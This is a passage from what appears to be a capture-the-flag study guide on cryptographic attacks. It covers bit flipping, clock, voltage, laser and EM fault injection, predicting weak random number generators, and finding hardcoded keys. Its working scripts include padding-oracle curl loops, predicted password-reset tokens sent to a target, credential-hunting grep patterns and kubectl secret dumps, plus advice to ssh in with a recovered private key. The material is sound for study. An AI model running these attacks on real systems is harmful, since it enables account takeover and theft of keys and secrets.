    modified_iv[pos] ^= ord(orig_char) ^ ord(target_char)

# Decrypt with modified IV
try:
    result = decrypt_cookie(ciphertext, key, bytes(modified_iv))
    print(f"Modified plaintext: {result}")
except:
    print("Padding error or decryption failure")
```

**2. Authentication Token Bit Flipping**

```python
# JWT-like structure without signature verification
# Base64(header).Base64(payload).signature

import base64
import json

def flip_jwt_bit(token, target_claim, new_value):
    parts = token.split('.')
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # Calculate bit positions
    original_json = json.dumps(payload)
    payload[target_claim] = new_value
    modified_json = json.dumps(payload)
    
    # XOR approach for specific byte changes
    modified_b64 = base64.urlsafe_b64encode(modified_json.encode()).decode().rstrip('=')
    return f"{parts[0]}.{modified_b64}.{parts[2]}"

# Usage in CTF
# token = "eyJ0eXAi...eyJyb2xl...signature"
# flipped = flip_jwt_bit(token, "role", "admin")
```

**3. File Format Bit Flipping**

```bash
# PNG/JPEG/ZIP bit manipulation
# CTF scenario: Flip bits to bypass file type checks

# Example: Change PNG magic bytes
xxd original.png | head -1
# 00000000: 8950 4e47 0d0a 1a0a  .PNG....

# Flip specific bits using dd
printf '\x89\x50\x4e\x47' | dd of=modified.png bs=1 seek=0 count=4 conv=notrunc

# Automated bit flipping with Python
with open('target.bin', 'r+b') as f:
    data = bytearray(f.read())
    data[offset] ^= (1 << bit_position)  # Flip specific bit
    f.seek(0)
    f.write(data)
```

**4. Memory Bit Flipping (Rowhammer-style)**

[Inference] While physical Rowhammer attacks require hardware access, CTF challenges may simulate memory corruption:

```python
# Simulated memory corruption for CTF
class SimulatedMemory:
    def __init__(self, size):
        self.memory = bytearray(size)
        
    def write(self, offset, data):
        self.memory[offset:offset+len(data)] = data
    
    def induce_fault(self, offset, bit_position):
        """Simulate single bit flip"""
        self.memory[offset] ^= (1 << bit_position)
    
    def read(self, offset, length):
        return bytes(self.memory[offset:offset+length])

# CTF usage: Flip privilege bits in simulated process memory
mem = SimulatedMemory(1024)
mem.write(0, b'\x00\x00\x00\x00')  # uid=0 (root) stored at offset 0
mem.induce_fault(0, 0)  # Flip bit to simulate corruption
```

**Detection and Testing Tools**

```bash
# Padding oracle detection (automated bit flipping)
# PadBuster
padbuster http://target.com/login encrypted_cookie 8 -encoding 0

# Manual padding oracle with curl
for i in {0..255}; do
    modified=$(python3 -c "import sys; sys.stdout.buffer.write(bytes([int('$i')]))")
    curl -b "session=$modified$rest_of_cookie" http://target.com/
done

# Bit flipping fuzzer for binary protocols
radamsa -n 1000 -o flipped_%n.bin input.bin
```

### Clock/Voltage Glitching

Hardware-level attacks that manipulate clock signals or supply voltage to cause instruction skips, conditional branch flips, or memory corruption during cryptographic operations.

**Clock Glitching Mechanism**

Clock glitching injects brief clock pulses or removes clock cycles to violate setup/hold timing constraints, causing:

- Instruction skips (fetch/decode errors)
- Register corruption
- Conditional jump flips (if → always taken/never taken)
- Loop counter manipulation

**Hardware Requirements**

```
Core equipment:
- ChipWhisperer (Lite/Pro/Husky)
- Bus Pirate with glitch capabilities
- Custom FPGA-based glitcher
- Oscilloscope (100MHz+ for timing analysis)
- Programmable delay generator

Target preparation:
- Exposed clock lines (XTAL pins, clock distribution)
- Decapped chip (for advanced attacks)
- Power analysis probes
- Trigger signal access (GPIO, serial TX/RX)
```

**ChipWhisperer Clock Glitching Setup**

```python
#!/usr/bin/env python3
import chipwhisperer as cw

# Connect to ChipWhisperer
scope = cw.scope()
target = cw.target(scope)

# Configure clock glitching parameters
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "clock_xor"
scope.glitch.trigger_src = "ext_single"

# Glitch parameters (CTF-specific tuning)
scope.glitch.width = 10  # Glitch width in clock cycles (tune: 1-50)
scope.glitch.offset = 20  # Offset from trigger (tune: -50 to +50)
scope.glitch.repeat = 1   # Number of glitches per trigger

# Attack loop
for width in range(5, 50):
    for offset in range(-10, 40):
        scope.glitch.width = width
        scope.glitch.offset = offset
        
        # Trigger target operation
        target.simpleserial_write('p', bytearray(16))  # Send command
        
        # Read response
        response = target.simpleserial_read('r', 16, timeout=1000)
        
        # Check for successful glitch
        if response and check_glitch_success(response):
            print(f"SUCCESS: width={width}, offset={offset}")
            break
```

**Attack Targets and Objectives**

**1. Authentication Bypass**

```python
# Target pseudocode:
# if (verify_password(input) == SUCCESS):
#     grant_access()
# else:
#     deny_access()

# Glitch objective: Skip password verification or flip comparison result

# ChipWhisperer timing analysis
scope.adc.samples = 5000
scope.adc.offset = 0

# Capture power trace to identify verification timing
trace = scope.capture()
# Analyze for comparison operation peak
# Set glitch trigger at comparison instruction
```

**2. Loop Counter Manipulation**

```c
// Target code structure
for(int i = 0; i < 1000000; i++) {
    // Perform expensive computation
}
if(expensive_check()) {
    grant_access();
}

// Glitch objective: Overflow/underflow loop counter
// Result: Skip expensive operation entirely
```

**3. Cryptographic Operation Corruption**

```python
# Target: AES encryption round
# Glitch during specific round to induce Differential Fault Analysis (DFA)

# Timing: Glitch during round 8-9 of AES-128
scope.glitch.trigger_src = "ext_continuous"
# Trigger on AES SubBytes operation using power pattern

# Collect faulty ciphertexts
faulty_outputs = []
for attempt in range(100):
    trigger_glitch_at_round(8)
    faulty_output = target.encrypt(plaintext)
    faulty_outputs.append(faulty_output)

# DFA analysis on faulty outputs
# Phoenix-like analysis tools can recover AES key
```

**Voltage Glitching Mechanism**

Voltage glitching briefly reduces or spikes VCC to cause:

- SRAM bit flips
- Flash read errors
- CPU core undervoltage → instruction corruption
- Brown-out reset bypass

**ChipWhisperer Voltage Glitching**

```python
# Configure voltage glitching
scope.io.glitch_hp = True  # High-power glitch output
scope.io.glitch_lp = False

# Voltage glitch parameters
scope.glitch.width = 30  # Duration in microseconds (tune: 10-1000)
scope.glitch.offset = 50  # Delay from trigger (tune: 0-10000)

# Target-specific tuning
for width in range(20, 100, 5):
    for offset in range(0, 200, 10):
        scope.glitch.width = width
        scope.glitch.offset = offset
        
        # Apply glitch during boot sequence
        target.reset()
        time.sleep(0.001)  # Wait for bootloader
        scope.glitch.manual_trigger()
        
        # Check if secure boot bypassed
        if target.read_output() == b"BYPASS_SUCCESS":
            print(f"Bootloader bypass: w={width}, o={offset}")
```

**CTF Simulation Environments**

[Inference] Physical glitching hardware may not be available in CTF environments. Simulated challenges often provide:

```python
# Simulated glitch challenge interface
import socket

def send_glitch_parameters(host, port, width, offset, repeat):
    """
    Connect to CTF glitch simulation server
    Server simulates hardware glitch effects
    """
    sock = socket.socket()
    sock.connect((host, port))
    
    # Protocol: GLITCH <width> <offset> <repeat>
    cmd = f"GLITCH {width} {offset} {repeat}\n"
    sock.send(cmd.encode())
    
    response = sock.recv(1024)
    sock.close()
    
    return response.decode()

# Brute-force parameter space
for width in range(1, 100):
    for offset in range(0, 500, 5):
        result = send_glitch_parameters("ctf.example.com", 9999, width, offset, 1)
        if "FLAG{" in result:
            print(f"Found flag with w={width}, o={offset}")
            print(result)
```

**Advanced Techniques**

**Crowbar Attack (Multiple Glitches)**

```python
# Multiple glitches in sequence to bypass layered defenses
scope.glitch.repeat = 5  # 5 consecutive glitches

# Timing for multi-stage authentication
glitch_offsets = [100, 250, 400, 600, 800]  # Multiple critical points

for offset_set in itertools.combinations(glitch_offsets, 3):
    # Apply glitches at multiple checkpoints
    success = apply_multi_glitch(offset_set)
    if success:
        print(f"Multi-glitch success: {offset_set}")
```

**Practical Detection Tools**

```bash
# ChipWhisperer analyzer
jupyter notebook
# Open ChipWhisperer tutorials for power analysis

# Glitch parameter optimization
python3 chipwhisperer/software/glitch_explorer.py \
    --target uart \
    --width-range 5-50 \
    --offset-range -20-100

# Power trace analysis with Riscure Inspector (commercial)
# Alternative: Free tools like Lascar
pip3 install lascar
```

### Laser Fault Injection

Laser-induced fault injection uses focused laser beams to induce localized voltage transients in semiconductor junctions, causing single or multiple bit flips with spatial precision.

**Physical Mechanism**

Laser illumination creates electron-hole pairs in silicon:

- **Photocurrent generation** in reverse-biased junctions
- **Transient voltage spikes** in CMOS logic gates
- **SRAM cell flipping** (6T/8T cell state changes)
- **Flash memory corruption** (charge pump disruption)

Wavelengths used:

- **1064nm (IR)**: Penetrates silicon packaging, reaches die backside
- **532nm (green)**: Surface attacks on decapped chips
- **405nm (violet)**: High precision, shallow penetration

**Hardware Requirements**

```
Essential equipment:
- Pulsed laser diode (1064nm, 532nm, or 405nm)
- Laser driver with pulse control (ns-μs duration)
- XYZ motorized stage (1μm precision minimum)
- Microscope with coaxial illumination
- Trigger synchronization (oscilloscope/FPGA)
- Decapping equipment (fuming nitric acid or plasma etcher)

Professional platforms:
- Riscure VC Glitcher (commercial, $100k+)
- NewAE ChipSHOUTER (EM-based alternative)
- Custom laser setup ($5k-20k with used components)
```

**Attack Setup and Calibration**

```python
# Conceptual laser control interface (platform-dependent)
class LaserFaultInjector:
    def __init__(self, port='/dev/ttyUSB0'):
        self.laser = serial.Serial(port, 115200)
        self.stage_x = 0
        self.stage_y = 0
        
    def set_position(self, x, y):
        """Move XYZ stage to target position (micrometers)"""
        cmd = f"MOVE {x} {y}\n"
        self.laser.write(cmd.encode())
        
    def set_pulse_parameters(self, duration_ns, power_mw):
        """Configure laser pulse width and power"""
        cmd = f"PULSE {duration_ns} {power_mw}\n"
        self.laser.write(cmd.encode())
        
    def trigger_pulse(self):
        """Fire laser at current position"""
        self.laser.write(b"FIRE\n")
        
    def scan_area(self, x_start, x_end, y_start, y_end, step=10):
        """Systematic area scan to identify sensitive locations"""
        results = []
        for x in range(x_start, x_end, step):
            for y in range(y_start, y_end, step):
                self.set_position(x, y)
                self.trigger_pulse()
                response = self.read_target_output()
                if response != expected_response:
                    results.append((x, y, response))
        return results
```

**Target Identification and Mapping**

```python
# Die reconnaissance workflow
# 1. Optical imaging of decapped chip
# 2. Identify functional blocks (CPU core, crypto accelerator, memory)
# 3. Map target regions for fault injection

def map_sensitive_regions(laser, x_range, y_range, step=50):
    """
    Coarse mapping to identify fault-sensitive areas
    """
    sensitivity_map = {}
    
    for x in range(x_range[0], x_range[1], step):
        for y in range(y_range[0], y_range[1], step):
            laser.set_position(x, y)
            
            # Test multiple laser parameters
            for power in [10, 50, 100, 200]:  # mW
                for duration in [10, 50, 100, 500]:  # ns
                    laser.set_pulse_parameters(duration, power)
                    
                    # Trigger target operation + laser
                    result = execute_target_with_fault()
                    
                    if result['fault_detected']:
                        key = (x, y)
                        if key not in sensitivity_map:
                            sensitivity_map[key] = []
                        sensitivity_map[key].append({
                            'power': power,
                            'duration': duration,
                            'effect': result['effect']
                        })
    
    return sensitivity_map
```

**Attack Categories**

**1. Instruction Skip Attack**

```python
# Target: Authentication check bypass
# Goal: Skip conditional branch instruction

# Pseudocode target:
# if (verify_signature(data, sig)):
#     return SUCCESS
# return FAILURE

# Attack: Inject fault during branch decision
# Timing: Synchronize with power trace signature

def instruction_skip_attack(laser, target):
    # Calibrate timing
    power_trace = capture_power_trace(target, operation='verify')
    branch_timestamp = identify_branch_instruction(power_trace)
    
    # Configure laser timing
    laser.set_trigger_delay(branch_timestamp)
    
    # Parameter sweep
    for x in range(cpu_core_x - 100, cpu_core_x + 100, 10):
        for y in range(cpu_core_y - 100, cpu_core_y + 100, 10):
            laser.set_position(x, y)
            laser.set_pulse_parameters(duration=50, power=100)
            
            result = target.execute_authentication()
            
            if result == "SUCCESS" and not signature_valid:
                print(f"Instruction skip success at ({x}, {y})")
                return True
```

**2. Memory Bit Flip Attack**

```python
# Target: SRAM/register bit flip
# Goal: Modify cryptographic key material or privilege flags

# Attack approach: Scan memory array regions
def memory_bitflip_attack(laser, memory_base_x, memory_base_y):
    """
    Induce single-bit errors in target memory cells
    """
    # Memory cell spacing (technology-dependent)
    cell_pitch = 5  # micrometers for older nodes
    
    results = []
    for row in range(0, 256, 8):  # Sample rows
        for col in range(0, 256, 8):  # Sample columns
            x = memory_base_x + col * cell_pitch
            y = memory_base_y + row * cell_pitch
            
            laser.set_position(x, y)
            laser.set_pulse_parameters(duration=100, power=50)
            
            # Read memory before fault
            original = target.read_memory(row, col)
            
            # Inject fault
            laser.trigger_pulse()
            
            # Read memory after fault
            modified = target.read_memory(row, col)
            
            if original != modified:
                bitflip = original ^ modified
                results.append({
                    'position': (x, y),
                    'address': (row, col),
                    'original': hex(original),
                    'modified': hex(modified),
                    'bitflip': bin(bitflip)
                })
    
    return results
```

**3. Differential Fault Analysis (DFA) on AES**

```python
# Goal: Extract AES key using fault injection during encryption
# Method: Induce single-byte fault in round 8 or 9

def aes_dfa_attack(laser, target, plaintext, known_ciphertext):
    """
    Laser-based DFA on AES encryption
    Requires 50-200 faulty ciphertexts for full key recovery
    """
    faulty_ciphertexts = []
    
    # Target round 9 of AES (before final round)
    aes_timing = calibrate_aes_timing(target)
    round_9_trigger = aes_timing['round_9_start']
    
    laser.set_trigger_delay(round_9_trigger)
    
    # Systematic scan of AES accelerator region
    for x in range(aes_core_x - 200, aes_core_x + 200, 20):
        for y in range(aes_core_y - 200, aes_core_y + 200, 20):
            laser.set_position(x, y)
            laser.set_pulse_parameters(duration=100, power=150)
            
            # Encrypt with fault injection
            faulty_ct = target.encrypt_with_trigger(plaintext)
            
            # Verify fault occurred (different from correct ciphertext)
            if faulty_ct != known_ciphertext:
                faulty_ciphertexts.append(faulty_ct)
                
                # Check if we have enough faults for DFA
                if len(faulty_ciphertexts) >= 50:
                    # Use DFA tool (phoenixAES, JeanGrey, etc.)
                    key_candidates = perform_dfa_analysis(
                        plaintext, 
                        known_ciphertext, 
                        faulty_ciphertexts
                    )
                    
                    if len(key_candidates) == 1:
                        print(f"AES key recovered: {key_candidates[0].hex()}")
                        return key_candidates[0]
    
    return None

# DFA analysis implementation (simplified)
def perform_dfa_analysis(plaintext, correct_ct, faulty_cts):
    """
    [Unverified] Simplified DFA - production tools like phoenixAES provide 
    complete implementation of multiple DFA techniques
    """
    from phoenixAES import crack  # External DFA library
    
    # Format fault data for analysis
    fault_data = []
    for fct in faulty_cts:
        fault_data.append({
            'plaintext': plaintext,
            'correct': correct_ct,
            'faulty': fct
        })
    
    # Perform DFA key recovery
    recovered_key = crack.analyze_faults(fault_data)
    return [recovered_key]
```

**CTF-Specific Laser Simulation**

[Inference] Physical laser equipment is expensive and specialized. CTF challenges typically simulate laser effects:

```python
# Simulated laser fault injection challenge
class LaserSimulator:
    def __init__(self, die_map_file):
        """
        Load simulated die map with sensitive regions
        """
        with open(die_map_file, 'r') as f:
            self.die_map = json.load(f)
        
        self.target_state = {}
        
    def inject_fault(self, x, y, power, duration, timing):
        """
        Simulate laser effect based on position and parameters
        Returns fault type: 'none', 'bitflip', 'instruction_skip', 'crash'
        """
        # Check if position hits sensitive region
        for region in self.die_map['sensitive_regions']:
            if self.point_in_region(x, y, region):
                # Calculate fault probability based on parameters
                if power >= region['min_power'] and \
                   duration >= region['min_duration']:
                    
                    if timing == region['trigger_timing']:
                        return region['fault_type']
        
        return 'none'
    
    def execute_operation_with_fault(self, operation, x, y, power, duration):
        """Simulate target execution with laser fault"""
        timing = self.get_operation_timing(operation)
        fault = self.inject_fault(x, y, power, duration, timing)
        
        return self.apply_fault_effect(operation, fault)

# CTF solver script
sim = LaserSimulator('challenge_die_map.json')

# Brute-force parameter space
for x in range(0, 10000, 50):
    for y in range(0, 10000, 50):
        for power in [50, 100, 150, 200]:
            result = sim.execute_operation_with_fault(
                'authentication', x, y, power, duration=100
            )
            
            if result['authenticated'] and not result['valid_password']:
                print(f"Authentication bypassed at ({x},{y}) with {power}mW")
                flag = result['flag']
                print(f"Flag: {flag}")
```

**Electromagnetic Fault Injection (EM-FI) Alternative**

While not laser-based, EM-FI provides similar fault injection capabilities with simpler equipment:

```python
# ChipSHOUTER EM-FI control (NewAE)
import chipwhisperer as cw

# Connect to ChipSHOUTER
em_injector = cw.scope()

# Configure EM pulse
em_injector.io.hs2 = "glitch"  # High-voltage pulse output
em_injector.glitch.trigger_src = "ext_single"

# Pulse parameters
em_injector.glitch.width = 10  # Pulse width (tune: 1-100)
em_injector.glitch.offset = 500  # Delay from trigger
em_injector.glitch.repeat = 1

# XY positioning for coil placement
# Manual positioning or motorized stage
for x_pos in range(-20, 20, 2):  # mm
    for y_pos in range(-20, 20, 2):  # mm
        print(f"Move coil to ({x_pos}, {y_pos})")
        input("Press enter when positioned...")
        
        # Trigger EM pulse during target operation
        target.execute_sensitive_operation()
        em_injector.glitch.manual_trigger()
        
        result = target.read_result()
        if result['fault_detected']:
            print(f"EM fault at position ({x_pos}, {y_pos})")
```

**Defensive Countermeasures (Recognition)**

Understanding defenses helps identify attack surface in CTF:

```
Hardware countermeasures:
- Light sensors (photodiode arrays)
- Active shields (top metal layer mesh with integrity check)
- Frequency randomization (clock jitter)
- Voltage monitoring (brown-out detectors)
- Redundant computation with comparison
- Error correction codes (ECC) in memory

Software countermeasures:
- Instruction duplication with comparison
- Control flow integrity (CFI) checks
- Time-constant operations (avoiding timing side-channels)
- Random delays (timing randomization)
```

**Relevant Tools and Frameworks**

```bash
# ChipWhisperer ecosystem (clock/voltage glitching)
pip install chipwhisperer

# Riscure Inspector (commercial, power/EM/laser analysis)
# No free alternative with equivalent capabilities

# Phoenix AES DFA tool (fault analysis)
git clone https://github.com/SideChannelMarvels/JeanGrey
cd JeanGrey
# Requires faulty AES ciphertexts

# Custom laser control (Arduino/Python)
pip install pyserial
# Interface with motor controllers and laser drivers

# EM-FI with ChipSHOUTER
# Available from NewAE Technology (~$3000-5000)
```

**Important Related Topics:**

- Side-channel analysis combined with fault injection (combined attacks)
- Secure boot bypass techniques using glitching
- Trusted Execution Environment (TEE) fault attacks
- Photonic emission analysis for reverse engineering
- Row-hammer attacks on DRAM as software-induced fault injection

---

# IMPLEMENTATION FLAWS

## Common Vulnerabilities

### Weak RNG (Random Number Generation)

Weak or predictable random number generation undermines cryptographic security by making keys, nonces, IVs, tokens, and session identifiers predictable or brute-forceable.

**Identifying Weak RNG:**

**Analyzing Random Values:**

```bash
# Collect multiple samples of "random" values
# Examples: session tokens, password reset tokens, cryptographic keys

# Statistical analysis for patterns
cat tokens.txt | sort | uniq -c  # Check for duplicates
cat tokens.txt | wc -l  # Total samples
cat tokens.txt | sort | uniq | wc -l  # Unique values

# Sequential analysis
for i in {1..100}; do
  curl -s https://target.com/api/token | jq -r '.token'
done > tokens.txt

# Check for sequential patterns
cat tokens.txt | while read line; do echo $((16#$line)); done | sort -n
```

**Entropy Analysis:**

```bash
# Using ent (entropy calculator)
ent tokens.txt

# Key metrics:
# - Entropy: Should be close to 8.0 bits per byte for true randomness
# - Chi-square: Values far from expected indicate bias
# - Arithmetic mean: Should be ~127.5 for bytes
# - Monte Carlo Pi: Should approximate π (3.14159...)

# Example weak RNG output:
# Entropy = 3.2 bits per byte (expected 8.0)
# Chi-square = 99.9% (indicates non-random)

# Using Python for analysis
python3 << EOF
import sys
from collections import Counter

data = open('tokens.txt', 'rb').read()
freq = Counter(data)
# Analyze frequency distribution
print(f"Unique bytes: {len(freq)}/256")
print(f"Most common: {freq.most_common(5)}")
EOF
```

**Timing-Based RNG Detection:**

```bash
# Check if tokens correlate with timestamp
for i in {1..20}; do
  timestamp=$(date +%s%N)
  token=$(curl -s https://target.com/api/token | jq -r '.token')
  echo "$timestamp,$token"
  sleep 0.1
done > timing_tokens.csv

# Analyze correlation
# If tokens increment or show patterns matching timestamps, RNG may be seeded with time
```

**Common Weak RNG Sources:**

**Linux Pseudo-Random Generators:**

```bash
# /dev/urandom vs /dev/random
# /dev/urandom: Non-blocking, suitable for most crypto (kernel CSPRNG)
# /dev/random: Blocking, waits for entropy (often unnecessary)

# Reading from urandom
head -c 32 /dev/urandom | xxd

# Weak alternative (DO NOT USE for crypto):
echo $RANDOM  # Bash PRNG - NOT cryptographically secure
# Range: 0-32767, predictable, insufficient for crypto

# Check entropy available
cat /proc/sys/kernel/random/entropy_avail
# Low values (<1000) may indicate entropy starvation on some systems
```

**Programming Language Pitfalls:**

**Python:**

```python
# WEAK - Do not use for cryptography
import random
random.seed(12345)  # Predictable if seed known
token = random.randint(0, 2**32)

# STRONG - Cryptographically secure
import secrets
token = secrets.token_hex(32)  # 32 bytes = 256 bits
token_int = secrets.randbelow(2**256)

# WEAK - time-seeded
import time
random.seed(int(time.time()))
```

**PHP:**

```php
// WEAK - Linear Congruential Generator
mt_srand(time());  // Predictable seed
$token = mt_rand();

// STRONG - CSPRNG
$token = bin2hex(random_bytes(32));
$token = openssl_random_pseudo_bytes(32);
```

**JavaScript/Node.js:**

```javascript
// WEAK - Math.random() is NOT cryptographically secure
const token = Math.random().toString(36);

// STRONG - crypto module
const crypto = require('crypto');
const token = crypto.randomBytes(32).toString('hex');
```

**Predicting Weak RNG Output:**

**Time-Based Seeds:**

```python
# If RNG seeded with timestamp, bruteforce possible seeds
import random
import time

# Collect token and approximate timestamp
observed_token = 0x1a2b3c4d
timestamp_range = range(1700000000, 1700000100)  # 100 second window

for ts in timestamp_range:
    random.seed(ts)
    if random.randint(0, 2**32) == observed_token:
        print(f"Found seed: {ts}")
        # Predict next values
        for i in range(5):
            print(f"Next: {random.randint(0, 2**32)}")
```

**PHP mt_rand() Exploitation:**

```bash
# Using php_mt_seed to recover seed from output
# https://github.com/GeorgeArgyros/Seed-Recovery

# Collect multiple mt_rand() outputs
echo "123456789
987654321
456789123" > outputs.txt

# Attempt seed recovery
php_mt_seed outputs.txt

# Once seed recovered, predict future values
```

**LCG (Linear Congruential Generator) Attacks:**

```python
# Many weak PRNGs use: X_{n+1} = (a * X_n + c) mod m
# If parameters known or guessable, predict entire sequence

# Example: Breaking simple LCG
def crack_lcg(outputs):
    # With 3+ outputs, can recover a, c, m
    # See https://tailcall.net/posts/cracking-rngs-lcgs/
    
    x0, x1, x2 = outputs[0], outputs[1], outputs[2]
    # Solve: x1 = (a*x0 + c) mod m
    #        x2 = (a*x1 + c) mod m
    # Use GCD and modular arithmetic to recover parameters
```

**Tools for RNG Analysis:**

- **ent**: Entropy calculator for statistical analysis
- **dieharder**: Battery of statistical tests for RNG quality
- **php_mt_seed**: PHP mt_rand() seed recovery
- **randcrack**: Python random module predictor
- **RNG-Test**: Comprehensive RNG testing suite

**CTF-Specific Weak RNG Scenarios:**

**Session Token Prediction:**

```bash
# Collect multiple session cookies
curl -c - https://target.com/login -d "user=test&pass=test" | grep session

# Extract and analyze token entropy
grep -oP 'session=\K[^;]+' cookies.txt > sessions.txt

# If tokens are sequential or time-based:
# Generate valid sessions by incrementing/decrementing
```

**Password Reset Token Attacks:**

```python
# If reset tokens use weak RNG seeded with user-controlled data
import hashlib
import requests

# Attempt to predict token for target user
username = "admin"
# If seeded with username hash:
seed = int(hashlib.md5(username.encode()).hexdigest()[:8], 16)

# Generate predicted tokens
import random
random.seed(seed)
predicted_token = ''.join(random.choices('0123456789abcdef', k=32))

# Test predicted token
r = requests.post('https://target.com/reset', data={'token': predicted_token})
```

**PRNG State Recovery:**

```python
# For Python's random module, state can be recovered with 624 outputs
# Using randcrack library

from randcrack import RandCrack
rc = RandCrack()

# Feed 624 observed 32-bit outputs
for i in range(624):
    rc.submit(observed_values[i])

# Predict next values
predicted = rc.predict_randint(0, 2**32)
```

**[Inference]** Common indicators of weak RNG in CTF challenges:

- Sequential or low-entropy tokens visible in traffic
- Timestamp correlation in token generation
- Short token lengths (< 128 bits)
- Patterns in hexadecimal representation
- Duplicate tokens across sessions

---

### Hardcoded Keys

Hardcoded cryptographic keys embedded in source code, binaries, or configuration files enable trivial decryption and system compromise.

**Discovery Techniques:**

**Source Code Analysis:**

```bash
# Search for common key patterns in code repositories
grep -r "BEGIN RSA PRIVATE KEY" .
grep -r "BEGIN PRIVATE KEY" .
grep -r "api_key\s*=\s*['\"]" .
grep -r "secret.*=.*['\"][a-zA-Z0-9+/=]{20,}" .
grep -riE "(password|passwd|pwd|secret|key|token)\s*=\s*['\"][^'\"]{8,}" .

# Search for encryption function calls with literal keys
grep -r "AES.*Cipher.*['\"][0-9a-fA-F]{32}" .
grep -r "Crypto\.createCipher.*['\"]" .
grep -r "openssl_encrypt.*['\"][0-9a-fA-F]+" .

# Using trufflehog for automated secrets detection
trufflehog filesystem --directory=/path/to/repo --json

# Using gitleaks
gitleaks detect --source=/path/to/repo --verbose

# Search git history (keys may be removed but in history)
git log -S "api_key" --all -p
git log -S "BEGIN PRIVATE KEY" --all -p
```

**Binary Analysis:**

**Strings Extraction:**

```bash
# Extract human-readable strings from binary
strings binary | grep -iE "(key|password|secret)"

# Focus on longer hex strings (potential keys)
strings binary | grep -E "^[0-9a-fA-F]{32,}$"

# Look for PEM-formatted keys
strings binary | grep -A 5 "BEGIN.*KEY"

# Extract wide strings (UTF-16)
strings -e l binary | grep -i key

# Search for specific encryption library strings nearby
strings binary | grep -A 5 -B 5 "AES\|DES\|RSA\|Cipher"
```

**Binary Disassembly:**

```bash
# Using radare2
r2 -A binary
[0x00000000]> aaa  # Analyze all
[0x00000000]> fs strings  # Focus on strings
[0x00000000]> f~key  # Filter for "key"
[0x00000000]> iz  # List strings in data sections

# Find xrefs to interesting strings
[0x00000000]> axt @@ str.*  # Cross-references to strings

# Using Ghidra
# Import binary, auto-analyze
# Search → For Strings → filter "key", "secret", "password"
# Right-click string → References → Show References to address

# Using objdump
objdump -d binary | grep -A 20 "aes\|cipher"
```

**Binary Grep for Key Material:**

```bash
# Search for common key sizes (128, 192, 256 bit = 16, 24, 32 bytes)
xxd binary | grep -E "([0-9a-f]{2} ){16}"  # 16 bytes
xxd binary | grep -E "([0-9a-f]{2} ){32}"  # 32 bytes

# Look for repeating patterns that may be keys
binwalk -E binary  # Entropy analysis - high entropy regions may contain keys
```

**Firmware Analysis:**

```bash
# Extract filesystem from firmware
binwalk -e firmware.bin
cd _firmware.bin.extracted/

# Search extracted files
find . -type f -name "*.conf" -exec grep -H "key\|password" {} \;
find . -type f -name "*.xml" -exec grep -H "key\|password" {} \;
find . -type f -name "*.json" -exec grep -H "key\|password" {} \;

# Check for certificate/key files
find . -type f \( -name "*.pem" -o -name "*.key" -o -name "*.crt" \)

# Extract strings from all binaries
find . -type f -executable -exec strings {} \; | grep -iE "key|secret" > potential_keys.txt
```

**Mobile Application Analysis:**

**Android APK:**

```bash
# Decompile APK
apktool d app.apk

# Search resources and manifests
grep -r "api_key" app/
grep -r "secret" app/res/values/strings.xml

# Analyze DEX files with jadx
jadx app.apk -d output/
grep -r "javax.crypto" output/ -A 10  # Find crypto usage
grep -r "SecretKeySpec" output/ -A 5  # Find hardcoded keys

# Check for encrypted assets
unzip app.apk
find . -name "*.db" -o -name "*.dat" -o -name "assets/*"
file assets/*  # Identify encrypted files
```

**iOS IPA:**

```bash
# Extract IPA
unzip app.ipa

# Analyze binary with class-dump (if not stripped)
class-dump Payload/App.app/App > headers.txt
grep -i "key\|secret\|password" headers.txt

# String extraction
strings Payload/App.app/App | grep -iE "key|secret|token"

# Check Info.plist and configuration files
plutil -p Payload/App.app/Info.plist
grep -r "api" Payload/App.app/*.plist
```

**Configuration Files:**

```bash
# Common locations for hardcoded keys
cat /etc/app/config.ini
cat /opt/app/settings.conf
cat ~/.app/credentials

# Docker containers
docker inspect container_id | grep -iE "key|password|secret"
docker cp container_id:/etc/app/config.ini .

# Environment variables in Docker
docker exec container_id env | grep -iE "key|secret|token"

# Kubernetes secrets (if accessible)
kubectl get secrets
kubectl get secret secret-name -o jsonpath='{.data}'
# Decode base64 values
echo "base64string" | base64 -d
```

**Web Application Analysis:**

**JavaScript Files:**

```bash
# Download and search all JS files
wget -r -l 1 -H -t 1 -nd -N -np -A.js https://target.com/
grep -r "api.*key\|secret\|token" *.js

# Using JSFinder
python3 JSFinder.py -u https://target.com

# Deobfuscate/beautify JS
js-beautify obfuscated.js > readable.js

# Common patterns to search:
grep -E "['\"](AKIA[0-9A-Z]{16})['\"]" *.js  # AWS Access Keys
grep -E "['\"](ghp_[a-zA-Z0-9]{36})['\"]" *.js  # GitHub Personal Access Tokens
grep -E "['\"](sk_live_[a-zA-Z0-9]{24,})['\"]" *.js  # Stripe Keys
```

**HTML/Template Files:**

```bash
# Search HTML source
curl -s https://target.com | grep -iE "api.*key|secret|token"

# Check meta tags
curl -s https://target.com | grep -o '<meta.*>' | grep -i key

# Search comments
curl -s https://target.com | grep -o '<!--.*-->' | grep -iE "key|password|todo"
```

**Database Dumps/Backups:**

```bash
# If database access obtained
SELECT * FROM config WHERE key LIKE '%secret%';
SELECT * FROM settings WHERE name LIKE '%key%';

# SQLite database
sqlite3 app.db "SELECT * FROM secrets;"
sqlite3 app.db ".dump" | grep -i key

# MySQL dump files
grep -i "INSERT INTO.*key" dump.sql
```

**Common Hardcoded Key Patterns:**

**Symmetric Keys:**

```python
# Python examples (vulnerable patterns)
AES_KEY = "0123456789abcdef0123456789abcdef"  # 32-char hex = 128-bit
DES_KEY = b"8bytekey"
SECRET = "hardcoded_secret_password"

# Proper alternative: Load from environment/keyring
import os
AES_KEY = os.environ.get('AES_KEY')
# Or use keyring/secrets management
```

**API Keys:**

```javascript
// JavaScript vulnerable patterns
const API_KEY = "AIzaSyDaGmWKa4JsXZ-HjGw7ISLn_3namBGewQe";
const SECRET = "sk_live_4eC39HqLyjWDarjtT1zdp7dc";
const TOKEN = "xoxp-1234567890-1234567890-1234567890-abcdef";

// Proper: Environment variables
const API_KEY = process.env.API_KEY;
```

**Private Keys:**

```bash
# Embedded RSA private key (vulnerable)
PRIVATE_KEY = """
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2...
-----END RSA PRIVATE KEY-----
"""

# If found in source, immediately extract and use:
echo "$PRIVATE_KEY" > private.key
chmod 600 private.key
ssh -i private.key user@target
# Or decrypt data encrypted with corresponding public key
```

**Encryption Key Extraction from Memory:**

```bash
# If process running, dump memory
